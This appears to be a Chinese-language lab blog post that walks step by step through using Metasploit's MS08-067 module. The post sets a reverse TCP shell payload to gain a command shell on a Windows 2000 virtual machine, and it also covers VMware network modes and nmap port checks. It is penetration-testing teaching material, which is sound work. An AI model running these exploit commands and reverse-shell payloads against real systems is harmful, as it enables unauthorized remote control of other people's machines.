---
title: metaspolit——制毒初试
date: 2018-08-07 10:32:00
tags:
- 0day安全
categories:
- 0day安全
---

本篇原文：https://www.cnblogs.com/20179204gege/p/7747655.html

原文写的很不错，在此基础上，以64位ubuntu+msf模块安装，和win 2000 SP4作为环境，进行实验

## 一、实验内容 ##
1.使用kali/ubuntu+msf进行靶机[即受攻击机]的漏洞扫描，利用metasploit选择其中的一个漏洞进行攻击，并获取权限。

2.分析攻击的原理以及获取了什么样的权限。


## 二、实验工具 ##
安装ubuntu和[metasploit framework](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)以及win 2000虚拟机[原文是安装kali和靶机系统windows10]。

## 三、实验步骤 ##
### （一）虚拟机下搭建渗透测试环境 ###

1.在虚拟机下安装kali攻击机系统/ubuntu+msf以及windows10靶机系统/win2000靶机。

![虚拟机情况](/assets/img/1.png)

**Kali是一个linux系统，Kali Linux预装了许多渗透测试软件，包括nmap (端口扫描器)、Wireshark (数据包分析器)、John the Ripper (密码破解器),以及Aircrack-ng (一应用于对无线局域网进行渗透测试的软件)**.用户可通过硬盘、live CD或live USB运行Kali Linux。Metasploit的Metasploit Framework支持Kali Linux，**Metasploit一套针对远程主机进行开发和执行Exploit代码的工具。**



2.设置**两台虚拟机网络为共享网络模式（若是vmware虚拟机则是NAT模式，在虚拟机-设置-网络适配器中可查看）**，自动分配IP地址，之后两台虚拟机就可以直接ping通。

（1）靶机ip地址获取:在cmd中输入**ipconfig**，获取ip地址为10.211.55.3。

![靶机ipconfig](/assets/img/3.png)

![win2000靶机ipconfig](/assets/img/1.jpg)

（2）攻击机ip地址获取：在shell中输入**ifconfig**，获取ip地址为10.211.55.4。

![攻击机ipconfig](/assets/img/4.png)

![ubuntu攻击机ipconfig](/assets/img/2.jpg)

（3）可见，两台虚拟机处于同一网段下，可以互相ping通。

![靶机ipconfig](/assets/img/5.png)
![攻击机ipconfig](/assets/img/6.png)

![win靶机ipconfig](/assets/img/4.jpg)
![ubuntu攻击机ipconfig](/assets/img/3.jpg)

**一般来说在unix或linux系统中会一直ping下去，这时按快捷键Ctrl+Z或Ctrl+C均可停止ping**。而win只会丢几个测试数据包，会自动结束。

（4）补充说明“vmware下虚拟机的三种网络模式”

**a.桥接。**桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，**物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段**，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。

**b.NAT。***NAT模式中，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网[最终要转变为宿主机的公网IP才能去外网]。*NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡是在vmware提供的一个虚拟网络。

NAT和桥接的比较: NAT模式和桥接模式虚拟机都可以上外网；由于NAT的网络在vmware提供的一个虚拟网络里，所以局域网其他主机是无法访问虚拟机的，而宿主机可以访问虚拟机，虚拟机可以访问局域网的所有主机，因为**真实的局域网相对于NAT的虚拟网络，就是NAT的虚拟网络的外网**，不懂的人可以查查NAT的相关知识；**桥接模式下，多个虚拟机之间可以互相访问；NAT模式下，多个虚拟机之间也可以相互访问。**

c.Host-Only。在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。**主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的**。[通过编辑-虚拟机网络编辑器可以查看到，.93.0的子网是NAT模式的，可以互相访问，而.37.0只是Host-Only，只能访问主机]

![虚拟网络情况](/assets/img/5.jpg)


在按步骤进行攻击操作后（详细步骤见第(三)部分），**发现作为靶机的win10系统无漏洞可攻击[比如开启445端口才可进行下述TCP链接攻击]，于是改用低版本win靶机系统进行试验，在vmware虚拟机下操作**。


注意设置网络模式！！！

设置虚拟机下的kali和windows靶机系统为NAT模式。其中设置靶机ip地址为192.168.87.131，攻击机ip地址为192.168.87.129，且互相都可以ping通。[也可以用本身分配的ip，不去手动设置]

![win2kServer](/assets/img/7.png)

![win2kServer](/assets/img/8.png)

![kail](/assets/img/9.png)



### （三）MS08_067远程漏洞攻击实践 ###

> 以下过程在ubuntu+msf和win 2000同样适用

1.在kali终端中开启msfconsole。

![msfconsole](/assets/img/10.png)

2.输入命令**search** ms08_067,会显示出找到的渗透模块，如下图所示[search 查找漏洞模块]：


![search ms08_067](/assets/img/11.png)

3.输入命令**use** exploit/windows/smb/ms08_067_netapi，进入该**漏洞模块的使用**。

![use ms08_067_netapi](/assets/img/12.png)

4.**输入命令show payloads会显示出有效的攻击载荷**，比如shell_reverse_tcp。

![shell_reverse_tcp](/assets/img/13.png)

5.命令show targets会显示出可以被攻击的靶机的操作系统型号，如下图所示：

![可被攻击的靶机的操作系统型号](/assets/img/14.png)

里面有windows 2000 Universal，大多通用的win 2000都可以

![ubuntu下msf使用](/assets/img/6.jpg)

6.使用命令set payload generic/shell_reverse_tcp设置攻击有效载荷。

![设置攻击有效载荷](/assets/img/15.png)


7.输入命令show options显示我们需要在攻击前需要设置的数据。

![攻击前需要设置的数据](/assets/img/16.png)

LHOST为攻击机ip，RHOST为靶机IP

8.输入命令set LHOST "kali Ip"，即set LHOST 192.168.87.129;set RHOST "Win Ip"，即set RHOST 192.168.87.131。

![参数设置](/assets/img/17.png)

![ubuntu下msf使用](/assets/img/7.jpg)


使用命令show options再次查看payload状态。

![参数设置后的payload状态](/assets/img/18.png)

9.输入命令exploit开始攻击，如下图所示是正常攻击成功结果。

![命令exploit开始攻击](/assets/img/19.png)

**这时你会发现，已经得到win的终端了出现C:\WINNT\system32**


10.在kali上执行ipconfig/all[实际是得到win靶机终端下的结果，毕竟kali已经得win的终端了]得到如下图所示：

![在kali上执行ipconfig/all](/assets/img/20.png)

在win 2000上执行同样的命令（**所得与上图相同**）如下图所示：


![win 2000上执行ipconfig/all](/assets/img/21.png)

11.输入“netstat -a”命令，可以查看靶机开启了哪些端口。

![win 2000上执行ipconfig/all](/assets/img/22.png)

**发现存在microsoft-ds，state是listening**。
**在linux下用nmap命令扫描端口可知，microsoft-ds正是对应445/tcp端口**

![nmap命令扫描端口](/assets/img/9.jpg)

12.输入“netstat -n”命令， 查看靶机端口的网络连接情况[在kail上win终端下，或win上的终端下执行]。

![查看靶机端口的网络连接](/assets/img/23.png)

确实TCP链接了两台虚拟机，目的/源IP正确

用ubuntu和win 2000得到的也是同样的结果：

![nmap命令扫描端口](/assets/img/8.jpg)

## 五、思考 ##

### 1.metasploit framework 回顾 ###

用到这里你会发现其实msf模块的使用就像在使用一个磁盘管理器[不管是search 模块，use模块，路径都体现了这一点]。

比如kali中，msf的路径为/usr/share/metasploit-framework【ubuntu下为/usr/opt/metasploit-framework/embedded/framework/modules】

![路径下msf](/assets/img/25.png)

比如**modules中，是我们在msf中经常会利用到的一些工具** 

![路径下module2](/assets/img/26.png)

- auxiliary：辅助模块

- encoders：**供msfencode编码工具使用**，具体可使用msfencode -l

- **exploits：攻击模块**，每个介绍msf的文章都会提到那个ms08_067_netapi,它就在这个目录。

- payloads：这里面列出的是攻击载荷，也就是攻击成功后执行的代码。比如我们常设置的windows/meterpreter/reverse_tcp就在这个文件夹下。

- post：后渗透阶段模块，在获得meterpreter的shell之后可以使用的攻击代码。比如常用的hashdump，arp_scanner就在这里。

### 2.metasploit framework的基本命令 ###

- msfpayload：用来生成payload或者shellcode

> 搜索的时候可以用msfpayload -l |grep “windows”这样的命令查询。
> 
> -o 选项可以列出payload所需的参数

- msfencode：msf中的编码器，现在常用msfpayload与它编码避免exploit的坏字符串（比如00，会起到隔断作用）

- msfconsole：开启metasploit的console

### 3.原理分析 ###

**MS08_067漏洞是著名的远程溢出漏洞**，影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。本次实验就是metasploit利用ms08_067漏洞对win2000虚拟机进行渗透测试。

**MS08_067是一个在windows445号端口上的漏洞，需要事先查看该端口是否开放[只有这个端口开放，才有可能进行这个漏洞的攻击]**，这里使用**“nmap -PS 靶机ip”**命令查看扫描所有开放的端口，发现445号端口开放。因此可以使用MS08_067漏洞进行exploit。

![路径下module2](/assets/img/24.png)

2.实验拓展

**本次实验获得了靶机的cmdshell**，**除了实验中展示的几种操作，还可以进行新建用户、截屏、记录键盘输入、获取ruby交互界面、进程迁移、安装成服务等等许多操作**。今后还可以**对浏览器、客户端等方面的攻击**进行拓展实践。